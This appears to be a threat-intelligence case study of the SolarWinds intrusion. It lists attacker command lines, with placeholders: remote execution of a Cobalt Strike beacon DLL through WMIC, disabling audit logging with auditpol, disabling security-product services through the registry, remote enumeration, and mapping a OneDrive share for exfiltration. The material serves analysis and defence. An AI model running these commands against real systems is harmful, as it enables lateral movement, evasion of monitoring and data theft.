


Case Study - Solar Winds  

`wmic /node:[target] process call create “rundll32  c:\windows\[folder]\[beacon].dll [export]”`

Attackers always ran the TEARDROP implant through  
rundll32.exe, which is also the main process used in  
communicating with the C2.  

`Invoke-WMIMethod win32_process -name create  -argumentlist ‘rundll32 c:\Windows\[folder]\[beacon].dll [export]’ -ComputerName [target]`  

When executed during lateral movement, rundll32.exe ran  
through WMIC. The Cobalt Strike DLL was likely deleted  
after completed execution to avoid forensic recovery.  

`netsh advfirewall firewall add rule name=”[rulename1]”  protocol=UDP dir=out localport=137 action=block`

Attackers used NETSH to configure firewall rules that limit  
certain UDP outbound packets (to reduce noise or  
footprint) before intense recon with NSLOOKUP and  
ADFIND  

`schtasks /query /v /s [target] /fo csv`

Attackers used multiple command-line utilities to  
enumerate running process, services, and signed-in users  
on a remote system before attempting lateral movement  

`sc \\[target] query type=service state=all`

Attackers used multiple command-line utilities to  
enumerate running process, services, and signed-in users  
on a remote system before attempting lateral movement.  
wmic /node:”[target]” service get name,startname


`auditpol /GET /category:”Detailed Tracking” auditpol /set /category:”Detailed Tracking” /success:disable /failure:disable[execution of several  commands and actions]auditpol /set /category:”Detailed Tracking” /success:enable /failure:enable  `

Attackers used AUDITPOL to prevent the collection of  
additional audit logs and evidence trail.

`fsutil volume diskfree c: `

Free space on disk before executing attacks that could  
use a lot of disk space (DCSync)  
`reg add HKLM\system\currentcontrolset\services\[service name] /v Start /t REG_DWORD /d 4′`  

Attackers set the service start registry key for security  
monitoring products to “disabled” (i.e., DWORD value of  
“4”). This prevented security products from loading when  
the system starts. In some cases, the attackers waited to  
perform activity on the system until the system restarts  
and security monitoring products were disabled.

`net use [drive]: “https://d.docs.live.net/[user-id]”  /u:[username] [password]`  

Attackers mapped a OneDrive share from the  
command-line using the net.exe command-line utility,  
possibly for exfiltration; other cloud services like Google  
Drive were most likely also used.